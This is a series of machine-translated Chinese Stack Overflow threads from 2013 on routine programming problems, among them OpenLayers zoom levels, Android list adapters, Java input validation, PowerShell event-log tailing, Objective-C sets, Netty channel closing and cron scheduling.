    double curRes = 78271.51695 / (Math.pow(2, minZoomLevel - 1));
    for (int i = 0; i &lt; len; i++) {
        resolutions[i] = curRes;
        curRes = curRes / 2;
    }

    options.setResolutions(resolutions);
} 
```

// 使用示例：

```
 OSMOptions osmOptions = new OSMOptions();

    setZoomLevelRange(osmOptions, 5, 11);

    OSM baseTileLayer = new OSM("Mapnik", 
      // for offline tiles:
      GWT.getHostPageBaseURL()
        + "tiles/${z}/${x}/${y}.png", 
      osmOptions); 
```

关键是：

1.  显然有一个神奇的缩放级别 1 分辨率（我还没有找到它是如何计算的）。
2.  您可以通过将它们乘以或除以 2 来添加更高和更低的分辨率。
3.  根据您用作最小缩放级别的设置来设置 zoomOffset 至关重要。

欢迎您，是的，您可以根据需要复制代码。

参考资料： http: [//forum.openstreetmap.org/viewtopic.php? id=6444](http://forum.openstreetmap.org/viewtopic.php?id=6444) [http://dev.openlayers.org/apidocs/files/OpenLayers/Layer/XYZ-js.html#OpenLayers.Layer.XYZ.zoomOffset](http://dev.openlayers.org/apidocs/files/OpenLayers/Layer/XYZ-js.html#OpenLayers.Layer.XYZ.zoomOffset) [http://osgeo-org.1560.n6.nabble.com/Can-t-restrict-Openlayers-Layer-OSM-to-use-specific-zoom-levels-td3926546.html](http://osgeo-org.1560.n6.nabble.com/Can-t-restrict-Openlayers-Layer-OSM-to-use-specific-zoom-levels-td3926546.html)

# android - android自定义listactivity arrayadapter

> ID：15262170
> 
> 赞同：0
> 
> 时间：2013-03-07T02:49:13.293
> 
> 标签：android, android-arrayadapter, listactivity

我试图围绕如何实现自定义 arrayadapter 来为列表活动提供项目，然后在新活动中显示该选定项目。

例如，我正在从一个 RESTful Web 服务中提取一个文档列表，并且我想在一个列表活动中显示这些文档。我对 API 的第一次调用将返回包含两个字段的 JSON 文档：标题和 ID。我想用 UI 中文档的标题来填充我的 listactivity。当我单击该项目时，理想情况下，它将打开一个正常的活动，在该活动中它将进行另一个 API 调用，以 JSON 格式返回整个选定的文档并将其显示到新活动的 UI 中。

在谷歌搜索之后，我想出了我认为我需要的步骤：

1.  创建一个只包含列表项的标题和 ID 的 RecordListItem 类。
2.  创建一个 RecordListItem 类型的数组适配器。
3.  将该数组适配器附加到我的列表活动中。
4.  ？？？

我对将所选项目的 id 传递给正常活动的正确方法感到困惑，因此我可以进行 API 调用以提取该特定记录。这些步骤有意义吗？

我习惯了网络开发，所以这是一种不同的思维方式，我被困住了。有人可以解释正确的步骤或可能将我指向在新活动中显示所选项目的教程吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:12:15.823

在您的 ArrayAdapter 构造函数中，您传递带有标题/id 的数组

```
public Docs_Array(Context context, Object[] docs) {
   super(context, R.layout.row, docs);
   this.context = context;
   this.docs = docs;
} 
```

在 getView 方法中，您将设置每一行的布局和信息，“位置”参数是您获取所需文档的方式。如果您想拥有不止一个东西，例如title+id，您可以将 Object[i] 实例转换为另一个数组。

```
public View getView(int position, View convertView, ViewGroup parent) {
   LayoutInflater inflater = (LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
   View rowView = inflater.inflate(R.layout.row, parent, false);
   TextView textView = (TextView)rowView.findViewById(R.id.row_title);
   textView.setText(((String[])docs[position])[0]); // 0 for title.
} 
```

为每个行视图添加一个 onClickListener，并且 ((String[])docs[position])[1] 将为您提供被点击的文档标题的 id。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:02:41.647

没有看到任何代码，听起来你是在正确的轨道上。我建议也许将 id 存储在`HashMap`使用`title`as`key`和`id as the`值`. Then, when you select your item you can look up the`id`using the`标题`and send it to your next`Activity 中。我大概就是这样处理的。

至于教程，如果您还没有，我将从[文档开始。](http://developer.android.com/reference/android/app/ListActivity.html)然后，如果你有一个特定的问题，我相信你可以在 SO 上找到类似的问题，在 Google 上还有更多。希望这可以帮助

# ios - CodeSign 错误：SDK“iOS 6.1”中的产品类型“应用程序”需要代码签名

> ID：15262177
> 
> 赞同：4
> 
> 时间：2013-03-07T02:50:17.713
> 
> 标签：ios, xcode4.5, code-signing

我知道以前有人问过这个问题。

但是，我已确保配置文件在项目和目标中。

实际上我应该在项目中还是在目标中设置它？

![在此处输入图像描述](../Images/5c6f6770afc303df4be022870433467c.png)

更新：我实际上可以在设备上安装应用程序，但当且仅当我将代码签名身份更改为 iPhone 开发人员进行调试时。

但是，我显然想使用我的分发配置文件而不是我的开发人员配置文件来启动应用程序。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-08T08:20:32.190

我终于解决了这个问题。

基本上我从 iTunes Connect 或苹果开发者网站上删除了所有证书和配置文件。

然后我等了5分钟。添加 2 个分发配置文件。然后再做一次。

有用。

哦，是的，我需要确保代码签名身份指向正确的配置文件。就是这样。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T07:25:06.193

使您的部署目标小于 6.1。它会工作

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-07-16T19:53:11.263

就我而言，我没有正确设置方案。新手有时会忘记这一点。

转到：产品 -> 方案 -> 编辑方案

选择`Archive`并确保`Build Configuration`具有所需的值 Debug/Release（与目标设置相比）

# java - 我需要控制台应用程序方面的帮助吗？

> ID：15262178
> 
> 赞同：0
> 
> 时间：2013-03-07T02:50:30.503
> 
> 标签：java

任何人都可以向我推荐一些我可以开始使用的很酷或有趣的 Java 控制台应用程序。我现在所知道的只是如何构建控制台应用程序（我对 java 有点陌生），但我想构建一些很酷的东西，我在课堂上所做的只是基本的业务应用程序（很无聊，但对 java 概念有帮助）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T02:53:18.230

这里有一些有趣的练习可以帮助您学习基本的 OOP 技术和更多的 Java 编程语言。

扑克：[http ://www.dreamincode.net/forums/topic/116864-how-to-make-a-poker-game-in-java/](http://www.dreamincode.net/forums/topic/116864-how-to-make-a-poker-game-in-java/)

井字游戏：[https ://code.google.com/p/java-console-tictactoe/source/browse/trunk/?r=8](https://code.google.com/p/java-console-tictactoe/source/browse/trunk/?r=8)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T02:57:38.237

首先，我强烈推荐**[Project Euler](http://projecteuler.net/)**，特别是如果你喜欢数学的话。

其次，我建议建立一个**井字游戏程序**。（以数字 1-9 输入你的移动；计算机更新屏幕并检查获胜条件。然后其他玩家输入他/她的移动，计算机更新屏幕等。）这是一个有趣的程序编写，但可以对某些人来说很难。

自动**取款机**也很有趣。你可以通过这个变得非常有创意——允许自己创建多个“帐户”、存取现金等。确保包括某种形式的透支检测！

模仿[**巨大的洞穴冒险**](http://en.wikipedia.org/wiki/Colossal_Cave_Adventure)也很有趣。不过，这可能需要永远。

**矩阵数学运算**可能是一个有趣的练习，这取决于你是否喜欢线性代数......`:)`

# actionscript-3 - 通过 Flash 中的代理连接

> ID：15262179
> 
> 赞同：0
> 
> 时间：2013-03-07T02:50:31.010
> 
> 标签：actionscript-3

我有一个由 AS3 (.swf) 制作的应用程序，该应用程序将连接到特定网站并检索数据并显示某些内容。它在 PC 上运行良好。

之后我需要它在机顶盒之类的东西上运行。当机顶盒直接连接到互联网时，该应用程序运行良好。但是通过代理连接时它不起作用。即使通过代理，机顶盒仍然可以连接到互联网。我不能为 Flash 设置安全性，因为这个机顶盒没有浏览器。

这是 AS3 连接互联网的方式：

```
var timeloader:URLLoader = new URLLoader();
var request:URLRequest = new URLRequest("http://www.google.com");
timeloader.load(request);
timeloader.addEventListener(Event.COMPLETE, dataComplete); 
```

有人有想法吗？

# java - 我应该如何对与数据库对话的 java 脚本进行多线程处理

> ID：15262187
> 
> 赞同：1
> 
> 时间：2013-03-07T02:51:18.187
> 
> 标签：java, mysql, multithreading, jdbc

这是我的脚本的作用：

它逐行解析包含 2700 万行的文档。我对每一行进行解析，然后将必要的信息插入到数据库表中（使用 JDBC）。

问题是，preparedStatement.executeUpdate() 方法不是异步的，所以它一直等到它返回，这就是我的瓶颈所在。解析 2700 万行大约需要 2 天 :(

由于 JDBC 没有异步支持，我想将每个 executeUpdate() 调用包装在一个线程中。我应该每次都创建一个新线程吗？或者我应该使用线程池，我应该如何创建该线程池？

我担心由于解析行几乎不需要任何时间，线程池中等待的活动任务数量将超过可用线程的数量，它会回到线性，瓶颈是等待打开的任务线程。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:00:29.490

1.  创建一个具有固定线程数的 Executor（以提供最佳性能的方式）
2.  创建一个最大大小的 BlockingQueue，比如 100
3.  向 Executor 提交所需数量的工作人员，每个工作人员都有对 BlockingQueue 的引用和他们自己的 Connection/PreparedStatement
4.  主线程解析`put()`BlockingQueue 上的文件和行
5.  工作线程`take()`从 BlockingQueue 中提取一行并更新数据库

（这是一个基本的生产者/消费者多线程场景）

# java - 在 Java 中使用 Scanner 验证双精度

> ID：15262188
> 
> 赞同：0
> 
> 时间：2013-03-07T02:51:23.667
> 
> 标签：java, validation, double, do-while

好的，所以我使用了许多验证脚本[`java.util.Scanner`](http://docs.oracle.com/javase/6/docs/api/java/util/Scanner.html)，但找不到任何可以帮助我满足我需要的东西。我已经很好地了解了如何设置我的程序，但我仍然需要一些帮助才能让它按照我想要的方式工作。基本上，我的目标是要求用户输入一个高度，并且我想确保它不超过 84 英寸、数字和正数。

到目前为止，这是我的代码：

```
// the part inside main() that is relevant
double height = 0;
Scanner input = new Scanner(System.in);

height = get_height(height, input);

private static double get_height(double height, Scanner input) {
        do {
            System.out.print("Please enter your height (in inches): ");
            while (!input.hasNextDouble() || input.nextDouble() > 84) {
                if (!input.hasNextDouble()) {
                    System.out.print("You must enter a valid number: ");
                    input.next();
                }
                else if (input.nextDouble() > 84) {
                    System.out.print("Are you really taller than 7 feet? Try again: ");
                    input.next();
                }
            }
            height = input.nextDouble();
        } while (height <= 0);

        return height;
    } 
```

这些是我得到的结果：

`Please enter your height (in inches): hey
You must enter a valid number: 100
100
Are you really taller than 7 feet? Try again: 64
(blank space)
64
64`

如您所见，或者您可能无法判断，它并没有完全击中应有的正确消息，然后它只留下空白行，您可以在需要之前输入两次数据（如您所见最后两行）。我不知道它为什么这样做，但显然它与我的逻辑有关。我想在循环之后使用 if 语句来验证它是 7 英尺，但如果它无效，那么我该如何重新启动循环？我唯一的想法是创建一个名为“valid”的布尔变量，并最初将其设置为 false，当它为 true 时退出循环并返回。我可以使用一些建议！

哦，对于那些想知道的人来说，这是家庭作业。我并不完全希望我的程序是为我编写的，但是一个建议会很可爱。

编辑：好的，我自己搞定了。感谢我收到的大量帮助..

```
 private static double get_height(double height, Scanner input) {
    boolean valid = false;
    while (!valid) {
        do {
            System.out.print("Please enter your height (in inches): ");
            while (!input.hasNextDouble()) {
                System.out.print("You must enter a valid number! Try again: ");
                input.next();
            }
            height = input.nextDouble();
            if (height > 84) {
                System.out.println("Are you really over 7 feet? I don't think so..");
                valid = false;
            }
             else {
                valid = true;
            }
        } while (height <= 0);
    }

    return height;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T02:56:10.087

你能只使用 1 个 do while 循环吗

```
do {
    //print messages
    height = input.nextDouble();
} while (!"validation conditions"); 
```

或者如果你想要不同的消息

```
boolean valid = false;
do {
    //edit
    System.out.print("Please enter your height (in inches): ");
    while (!input.hasNextDouble()) {
        System.out.print("You must enter a valid number! Try again: ");
        input.next();
    }// end edit

    height = input.nextDouble();
    if(height > 84) {
        valid = false;
        System.out.println("too tall");
    } //add more else if conditions
    else {
        valid = true;
    }
} while (!valid); 
```

# statistics - 如何获得第 n 次展示后点击广告的概率？

> ID：15262193
> 
> 赞同：0
> 
> 时间：2013-03-07T02:52:22.320
> 
> 标签：statistics

我有 2 个表格、点击次数和展示次数。

clicks 表保存用户对广告的点击，类似于；广告id、用户id、点击时间

印象表保存用户对广告的印象；广告ID、用户ID、展示时间

为了对我使用 CTR 的广告进行排名；广告的总点击次数/广告的总展示次数

几天前我注意到通常在第二次印象后不点击的用户从不点击广告，你知道我如何使用这些数据对每个用户的广告进行排名吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:22:33.247

如果我理解正确，点击率将足以按**每个用户**对广告进行排名（点击次数/展示次数 -> 随着展示次数的增加为零）。

但是，如果您想对展示次数**进行全局**排名（不仅仅是每个用户），也许您可​​以使用某种阈值，（即忽略点击次数 = 0 的 CTR）。

此外，可能值得研究**Position Normalized CTR**。这篇文章有些过时，但您可能会发现它很有用：

[http://certifiedknowledge.org/blog/google-adwords-quality-score-factors-demystified/](http://certifiedknowledge.org/blog/google-adwords-quality-score-factors-demystified/)

# javascript - 自定义浏览按钮上传文件

> ID：15262195
> 
> 赞同：0
> 
> 时间：2013-03-07T02:52:41.287
> 
> 标签：javascript

嗨，我目前有自定义 2 按钮，称为浏览和导入。我也有一个输入类型作为文本。我的问题是如何浏览和选择记录并在输入类型文本中放置

请指教

```
<input type="button" id="btnBrowse" value="Browse" onclick="document.getElementById('fileID').click(); return false" style="height:31px; font-size:14px; background-color:#3399FF" class="k-button" />
       <input type="submit" id="btnSubmit" value="Import" style="height:31px; font-size:14px; background-color:#3399FF" class="k-button" />
       <input type="text" id="fileName" class="file_input_textbox" readonly="readonly"> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T03:04:59.893

但是，您几乎可以自定义任何其他 html 元素。这是一个完整的解决方案：

```
<input id="btn" type="file" style="display:none;" onchange="document.getElementById('file').value=this.value.substring(this.value.lastIndexOf('\\')+1);">

<input id="file" type="text" style="width:200px;">

<input type="button" onclick="document.getElementById('btn').click();" value="click me" /> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:12:26.740

当然，您可以设置文件输入按钮的样式。这已经在 SO 上被一遍又一遍地覆盖了。例如，[标注文件上传按钮](https://stackoverflow.com/questions/686905/labeling-file-upload-button/686919)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T02:55:20.110

您可以使用

```
<input type="file"/> 
```

# windows - Powershell - 尾窗事件日志？是否可以？

> ID：15262196
> 
> 赞同：16
> 
> 时间：2013-03-07T02:52:47.540
> 
> 标签：windows, powershell, event-log, tail

如何使用 powershell 跟踪特定的 Windows 事件日志？是否可以？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-07T03:08:44.543

我有时会这样做：

```
$idx = (get-eventlog -LogName System -Newest 1).Index

while ($true)
{
  start-sleep -Seconds 1
  $idx2  = (Get-EventLog -LogName System -newest 1).index
  get-eventlog -logname system -newest ($idx2 - $idx) |  sort index
  $idx = $idx2
  } 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-05-03T17:11:48.163

根据 MSDN 文档：

> `Get-WinEvent`旨在替换`Get-EventLog`运行 Windows Vista 和更高版本 Windows 的计算机上的 cmdlet。 `Get-EventLog`仅在经典事件日志中获取事件。`Get-EventLog`保留在 Windows PowerShell 中以实现向后兼容性。

并且由于我自己需要跟踪*非*经典事件日志（这会是一个新的*事件日志*吗？），这是@mjolinor 的非常简洁的代码，重新用于使用 `Get-WinEvent`：

```
Set-PSDebug -Strict
function Get-WinEventTail($LogName, $ShowExisting=10) {
    if ($ShowExisting -gt 0) {
        $data = Get-WinEvent -provider $LogName -max $ShowExisting
        $data | sort RecordId
        $idx = $data[0].RecordId
    }
    else {
        $idx = (Get-WinEvent -provider $LogName -max 1).RecordId
    }

    while ($true)
    {
        start-sleep -Seconds 1
        $idx2  = (Get-WinEvent -provider $LogName -max 1).RecordId
        if ($idx2 -gt $idx) {
            Get-WinEvent -provider $LogName -max ($idx2 - $idx) | sort RecordId
        }
        $idx = $idx2

        # Any key to terminate; does NOT work in PowerShell ISE!
        if ($Host.UI.RawUI.KeyAvailable) { return; }
    }
} 
```

为方便起见，我添加了一些花里胡哨：

*   默认情况下，它最初显示日志的最后 10 行，然后在出现新条目时连接它们——您可以通过`ShowExisting`参数将其调整为任何数字。
*   `Get-WinEvent`由于 tail 需要的自然顺序，它以最旧的第一个记录（与 ' 的默认值相反）对记录进行排序。
*   您可以按任意键终止（但不能在 PowerShellISE 中）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-09-30T17:27:41.057

首先，谢谢迈克尔！

对我的用例进行了轻微改进，包括显示整个多行消息值。

```
 function Get-WinEventTail($Provider="JobRequestQueueConsumerBackgroundService", $ShowExisting=10) {
    $formatProperty = @{ expression={$_.TimeCreated}; label="TimeCreated"}, 
                      @{ expression={$_.Message}; label="Message"; width=100}
    if ($ShowExisting -gt 0) {
        $data = Get-WinEvent -ProviderName $Provider -max $ShowExisting
        if ($data) { 
            $data | sort RecordId | Format-Table -Property $formatProperty -Wrap
            $idx = $data[0].RecordId
        }
    }
    else {
        $idx = (Get-WinEvent -ProviderName $Provider -max 1).RecordId
    }

    while ($true)
    {
        start-sleep -Seconds 1
        $idx2  = (Get-WinEvent -ProviderName $Provider -max 1).RecordId
        if ($idx2 -gt $idx) {
            Get-WinEvent -ProviderName $Provider -max ($idx2 - $idx) | sort RecordId | Format-Table -Property $formatProperty -Wrap
        }
        $idx = $idx2

        # Any key to terminate; does NOT work in PowerShell ISE!
        if ($Host.UI.RawUI.KeyAvailable) { return; }
    }
}

Get-WinEventTail 
```

该`-Wrap`选项是显示多行消息所必需的，否则省略号会截断第一行末尾的消息。设置列宽没有帮助。

# css - 如何使用 CSS 正确对齐元素

> ID：15262197
> 
> 赞同：0
> 
> 时间：2013-03-07T02:52:50.447
> 
> 标签：css

我的网站布局非常简单。我希望它看起来像这样：

*   跨越页面宽度的一行文本。
*   其下方有四个单独的文本列。
*   下面的两列 where：
    *   左边的列更薄，跨越页面的剩余高度。
    *   右侧的列有一小行文本，然后在其下方有另一行跨越页面剩余高度的文本。

![](../Images/2cf53460cdedb2d9c48ddaed2b7033dc.png)

每个红色块都是文本。现在，我只是将每个块放在下一个块的下方，全部居中。我希望它像上图一样布局。

我似乎无法弄清楚如何正确地做到这一点。使用相对对齐是一团糟。百分比似乎也不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:52:28.843

网站分为多个块（或列）。由设计人员/开发人员将其划分为独立的组（如侧边栏、页眉、页脚、内容等）

学习基础知识非常重要。[这个网站](http://learnlayout.com//)有相当不错的直观教程 HTML

也结帐

*   [从头开始设计 HTML5 布局](http://coding.smashingmagazine.com/2009/08/04/designing-a-html-5-layout-from-scratch/)
*   [语义 HTML5 布局](http://www.codeproject.com/Articles/146409/Semantic-HTML5-Page-Layout)

还可以借助包含浏览器的开发人员工具从您遇到的网站中获取线索。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:03:10.360

我先把它分成大块：

![一件真正的艺术品](../Images/f7315e0febb5b8ebb5e13f3da467b2cb.png)

从那里，只需制作结构：

```
<header>
    ...
</header>

<nav>
    <ul>
        <li>...</li>
        <li>...</li>
        <li>...</li>
        <li>...</li>
    </ul>
</nav>

<aside>
    ...
</aside>

<div id="main">
    <article>
        ...
    </article>

    <article>
        ...
    </article>
</div> 
```

CSS 非常简单。只需查看**流畅的两列布局 css**并阅读其中的众多文章。

# objective-c - 根据属性从 NSArray 创建一个 NSSet

> ID：15262198
> 
> 赞同：8
> 
> 时间：2013-03-07T02:52:52.020
> 
> 标签：objective-c, nsarray, nsset

如何`NSSet`根据属性从数组创建对象。

例如，对象数组，每个对象都具有对`type`属性的强引用，并且数组中存在每种类型的多次出现。这怎么能变成`NSSet`持有每种类型的单个对象。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-07T03:05:34.683

```
NSSet *distinctSet = [NSSet setWithArray:[array valueForKeyPath:@"@distinctUnionOfObjects.property"]]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T20:41:30.480

字典本质上已经具有此功能。它的键是一个集合，因此您可以创建字典来保存对象，并以您感兴趣的任何属性为键：

```
[NSDictionary dictionaryWithObjects:arrayOfObjects 
                            forKeys:[arrayOfObjects valueForKey:theAttribute]]; 
```

如果您现在查询字典`allValues`，则每个属性只有一个对象。我应该提到，通过这个程序，后面的对象将被保留在前面。如果原始数组的顺序很重要，请在创建字典之前将其反转。

您实际上不能将这些对象放入 中`NSSet`，因为`NSSet`将使用对象`isEqual:`和`hash`方法来确定它们是否应该是成员，而不是关键属性（当然，如果这是您自己的类，您可以覆盖这些方法，但是这可能会干扰他们在其他收藏中的行为）。

如果你真的觉得你需要一个集合，你将不得不编写你自己的类。您可以子类`NSSet`化，但传统观点认为 Cocoa 集合的组合比子类化要容易得多。本质上，您编写了一个涵盖您感兴趣的任何设置方法的类。这是一个（非常不完整且完全未经测试的）草图：

```
@interface KeyedMutableSet : NSObject

/* This selector is performed on any object which is added to the set.
 * If the result already exists, then the object is not added.
 */
@property (assign, nonatomic) SEL keySEL;

- (id)initWithKeySEL:(SEL)keySEL;

- (id)initWithArray:(NSArray *)initArray usingKeySEL:(SEL)keySEL;

- (void)addObject:(id)obj;

- (NSArray *)allObjects;

- (NSArray *)allKeys;

- (BOOL)containsObject:(id)obj;

- (NSUInteger)count;

-(void)enumerateObjectsUsingBlock:(void (^)(id, BOOL *))block;

// And so on...

@end 
```

* * *

```
#import "KeyedMutableSet.h"

@implementation KeyedMutableSet
{
    NSMutableArray * _objects;
    NSMutableSet * _keys;
}

- (id)initWithKeySEL:(SEL)keySEL
{
    return [self initWithArray:nil usingKeySEL:keySEL];
}

- (id)initWithArray:(NSArray *)initArray usingKeySEL:(SEL)keySEL
{
    self = [super init];
    if( !self ) return nil;

    _keySEL = keySEL;
    _objects = [NSMutableArray array];
    _keys = [NSMutableSet set];

    for( id obj in initArray ){
        [self addObject:obj];
    }

    return self;
}

- (void)addObject:(id)obj
{
    id objKey = [obj performSelector:[self keySEL]];
    if( ![keys containsObject:objKey] ){

        [_keys addObject:objKey];
        [_objects addObject:obj];
    }
}

- (NSArray *)allObjects
{
    return _objects;
}

- (NSArray *)allKeys
{
    return [_keys allObjects];
}

- (BOOL)containsObject:(id)obj
{
    return [_keys containsObject:[obj performSelector:[self keySEL]]];
}

- (NSUInteger)count
{
    return [_objects count];
}

- (NSString *)description
{
    return [_objects description];
}

-(void)enumerateObjectsUsingBlock:(void (^)(id, BOOL *))block
{
    for( id obj in _objects ){
        BOOL stop = NO;
        block(obj, &stop);
        if( stop ) break;
    }
}

@end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T03:03:21.457

```
NSMutableSet* classes = [[NSMutableSet alloc] init];
NSMutableSet* actualSet = [[NSMutableSet alloc] init];

for(id object in array) {
    if([classes containsObject:[object class]] == NO) {
        [classes addObject:[object class]];
        [actualSet addObject:object];
    }        
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-07T02:59:38.753

你会使用：

```
NSSet* mySetWithUniqueItems= [NSSet setWithArray: yourArray]; 
```

无论您的数组中的对象类型如何，这都应该有效，并且将填充 NSSet 并且您的数组中只出现一次任何重复的对象。

我希望这有帮助。

更新：下一个最好的事情是：首先使用类名和对象属性的连接，然后使用上述方法。

```
self.concatenatedArray=[NSMutableArray arrayWithCapacity:4];

for (TheClass* object in self.myArray)
    [self.concatenatedArray addObject:[NSString stringWithFormat:@"%@-%@",[object class], object.theProperty]];

self.mySet=[NSSet setWithArray:self.concatenatedArray]; 
```

我不确定您将使用 NSSet 输出做什么，但您可能可以修改串联元素以在 NSSet 输出中获得所需的信息。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-08T20:16:14.140

我创建了一个简单的库，称为[Linq to ObjectiveC](https://github.com/ColinEberhardt/LinqToObjectiveC)，它是使此类问题更容易解决的方法的集合。在您的情况下，您需要[Linq-to-ObjectiveC distinct](https://github.com/ColinEberhardt/LinqToObjectiveC#distinct)方法：

```
NSSet* dictionary = [NSSet setWithArray:[sourceArray distinct:^id(id item) {
    return [item type] ;
}]]; 
```

这将返回一个集合，其中每个项目都有不同的`type`属性。

# objective-c - UIPickerView UIScrolling with view

> ID：15262203
> 
> 赞同：0
> 
> 时间：2013-03-07T02:53:24.417
> 
> 标签：objective-c, uipickerview, xcode4.6

我有一个`UIPickerView`带有多个按钮和文本字段的可滚动视图。`UIPickerView`将值选择到两个文本字段中。现在，问题还`UIPickerView`在于随着页面滚动。谁能指导我如何`UIPickerView`在可滚动页面上保持底部和不透明？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:13:31.467

您需要将 the 添加`UIPickerView`到`UIScrollView`（可能是您正在使用的`view`属性的属性）的超级视图中。`UIViewController`

您可能还希望`contentSize`通过选取器视图的高度来扩展滚动视图的属性，以便滚动视图中的所有对象都可以在屏幕上滚动并且不会隐藏在选取器视图下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:28:59.207

在滚动视图的顶部获取另一个视图并将您的 UIPickerView 放入其中，这样它现在就独立于您的 UIScrollView 了，如下所示：

![在此处输入图像描述](../Images/ac3ac4003345ee9bf64934d20595c9d6.png)

# linux - 我想每分钟自动使用脚本 chmod 这是我的脚本吗？

> ID：15262204
> 
> 赞同：0
> 
> 时间：2013-03-07T02:53:27.593
> 
> 标签：linux, cron, crontab

我想每分钟自动使用脚本 chmod 这是我的脚本

```
# vim /home/crontab/chmod.sh 
#!/bin/sh 
chmod +x /home

```

这是我的 crontab

```
# crontab -e 
*/5 * * * * /home/crontab/chmod.sh

```

我的脚本和 crontab 有什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:27:15.663

每分钟的 Cron 表达式：-

```
*/1 * * * * <ur command> 
```

并且要执行你的脚本首先在你的脚本上执行 chmod。

```
chmod +x /home/crontab/chmod.sh 
```

并且不要忘记在crontab 和 Shell 脚本的**末尾添加一个****空白的新行。**

# java - netty 3.5.7 Channel.close() 抛出异常导致 closefuture 未通知

> ID：15262208
> 
> 赞同：1
> 
> 时间：2013-03-07T02:53:42.430
> 
> 标签：java, netty

我正在挖掘我的netty程序中的一个错误：我在服务器和客户端之间使用了一个心跳处理程序，当客户端系统重新启动时，服务器端的心跳处理程序会意识到超时然后关闭通道，但有时监听器注册在频道的 CloseFuture 永远不会被通知，这很奇怪。

在挖掘netty 3.5.7源码后，我发现只有通过AbstractChannel.setClosed()来通知Channel的CloseFuture；可能这个方法在Channel关闭时不会执行，见下图：

NioServerSocketPipelineSink：

```
private static void close(NioServerSocketChannel channel, ChannelFuture future) {
    boolean bound = channel.isBound();
    try {
        if (channel.socket.isOpen()) {
            channel.socket.close();
            Selector selector = channel.selector;
            if (selector != null) {
                selector.wakeup();
            }
        }

        // Make sure the boss thread is not running so that that the future
        // is notified after a new connection cannot be accepted anymore.
        // See NETTY-256 for more information.
        channel.shutdownLock.lock();
        try {
            if (channel.setClosed()) {
                future.setSuccess();
                if (bound) {
                    fireChannelUnbound(channel);
                }
                fireChannelClosed(channel);
            } else {
                future.setSuccess();
            }
        } finally {
            channel.shutdownLock.unlock();
        }
    } catch (Throwable t) {
        future.setFailure(t);
        fireExceptionCaught(channel, t);
    }
} 
```

在某些平台 channel.socket.close() 可能会抛出 IOException，这意味着 channel.setClosed() 可能永远不会执行，因此可能不会通知在 CloseFuture 中注册的侦听器。

这是我的问题：你遇到过这个问题吗？分析对吗？

我发现这是我的心跳处理程序导致问题：永远不会超时，所以永远不要关闭频道，下面是在计时器中运行：

```
if ((now - lastReadTime > heartbeatTimeout)
                    && (now - lastWriteTime > heartbeatTimeout)) {
                getChannel().close();
                stopHeartbeatTimer();
            } 
```

其中 lastReadTime 和 lastWriteTime 更新如下：

```
public void writeComplete(ChannelHandlerContext ctx, WriteCompletionEvent e)
        throws Exception {
    lastWriteTime = System.currentTimeMillis();
    super.writeComplete(ctx, e);
}

public void messageReceived(ChannelHandlerContext ctx, MessageEvent e)
        throws Exception {
    lastReadTime = System.currentTimeMillis();
    super.messageReceived(ctx, e);
} 
```

远程客户端是Windows xp，当前服务器是Linux，都是jdk1.6。我认为在远程客户端系统重新启动后，writeComplete 仍然在内部调用，虽然没有调用 messageReceived，但在此期间没有抛出 IOExceptoin。

我将重新设计心跳处理程序，在心跳包中附加一个时间戳和一个HEART_BEAT标志，当对端收到数据包时，以相同的时间戳和ACK_HEART_BEAT标志发回数据包，当当前端收到这个ack包时，使用这个更新 lastWriteTime 的时间戳。

# java - 尝试传递表单选择的值并在文本字段中显示 onclick

> ID：15262209
> 
> 赞同：0
> 
> 时间：2013-03-07T02:53:47.820
> 
> 标签：java, forms, variables, onclick

没有正确设置任何变量，现在我只是想使用报价按钮 aQuote() 让我的单选选择的值显示在字段中......然后我也希望能够从宽度和高度来创建最终的总输出到该字段，但我什至无法实现第一件事。

```
var form = 1;
var chosen = document.inputForm.pack.value;
var width = 1;
var length = 1;

function aquote() {

  document.getElementById("qprice").value = chosen ;
} 
```

HTML：

```
<form id="inputForm" method="post" onSubmit="return validateForm();" action="submit.php">  
    <fieldset>
<label>First Name:</label>
        <input type="text" name="first_name" />
        <br />
        <label>Surname:</label>
        <input type="text" name="surname" />
        <br />
        <label>Mobile:</label>
        <input type="text" name="mobile" />
        <br />
        <label>Email:</label>
        <input type="text" name="email" /><br />
<div class="textRightform">
<label class="radio2">Pool package:</label><br>
 <input type="radio" name="pack" value="2000"
            checked="checked" />Rectanguluar
            <input type="radio" name="pack" value="2500" onClick="getCheckedRadio()"/>Rectangluar with Spa
            <input type="radio" name="pack" value="3000" />Round Pool
            <input type="radio" name="pack" value="3500" />Round Pool with Spa<br><br>
         <label>Length meters</label><input name="length" type="number" size="7" maxlength="4"><br>
         <label>Width meters</label><input name="width" type="number" size="8" maxlength="4"><br><br>
         <input name="quoteshow" type="text" value="" id="qprice" readonly /><br>
